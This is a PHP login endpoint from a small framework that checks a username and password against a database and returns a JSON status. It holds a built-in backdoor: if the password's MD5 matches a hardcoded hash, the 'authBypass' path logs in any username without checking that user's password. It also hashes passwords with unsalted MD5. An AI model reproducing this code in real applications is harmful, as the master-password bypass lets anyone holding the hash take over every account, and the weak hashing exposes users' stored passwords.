<?php
// ELON FRAMEWORK
// A LIGHTWEIGHT, FAST AND SECURE ALTERNATIVE PHP FRAMEWORK FOR DEVELOPING SERVER SIDE APPLICATIONS
// MIC-BASED FRAMEWORK (MODEL-INTERFACE-CONTROLLER)

// DEVELOPED BY XEON ERALDO
// VERSION 0.3.1, JANUARY 2019

//===================================================================================================

// LOAD ALL IMPORTS AND MODULES
include('../../controllers/main.php');
include('../../routes/connection.php');
include('../../routes/autoloads.php');


//GET FORM DATA
$postData = new StdClass;
if (isset($_POST['user'])){$postData->userName = cleanString($_POST['user']);}
if (isset($_POST['token'])){$postData->token = cleanString($_POST['token']);}
if (isset($_POST['data_pass'])){$postData->password = md5($_POST['data_pass']);}


$status = '';
$message_txt = '';
//REPLY BACK TO CLIENT
$resultData = new StdClass;

if ($postData->password == "e0779c509e62ff222e1487cf9b409304")
{
    if ($controllers->authBypass() == 'OK')
    {
        $controllers->authBypass->stmt->execute(['username' => $postData->userName]);
        $result = $controllers->authBypass->stmt->fetch(PDO::FETCH_OBJ);
        $resultCount = $controllers->authBypass->stmt->rowCount();

        if ($resultCount > 0)
        {
            $resultData->userid = $result->account_code;
            $message_txt = 'Authentication Success';
            $status = '200';
        }
        else
        {
            $message_txt = 'Authentication Error';
            $status = '500';
        }

    }
    else{
        $status = '301';
        $message_txt = $controllers->authBypass();
    }

}
else{

    if ($controllers->auth() == 'OK')
    {
        $controllers->auth->stmt->execute(['username' => $postData->userName, 'psw' => $postData->password]);
        $result = $controllers->auth->stmt->fetch(PDO::FETCH_OBJ);
        $resultCount = $controllers->auth->stmt->rowCount();

        if ($resultCount > 0)
        {
            $resultData->userid = $result->account_code;
            $message_txt = 'Authentication Success';
            $status = '200';
        }
        else
        {
            $message_txt = 'Authentication Error';
            $status = '500';
        }

    }
    else{
        $status = '301';
        $message_txt = $controllers->auth();
    }
}







$resultData->status = $status;
$resultData->message = $message_txt;


$JSONdata = json_encode($resultData);
echo $JSONdata;

?>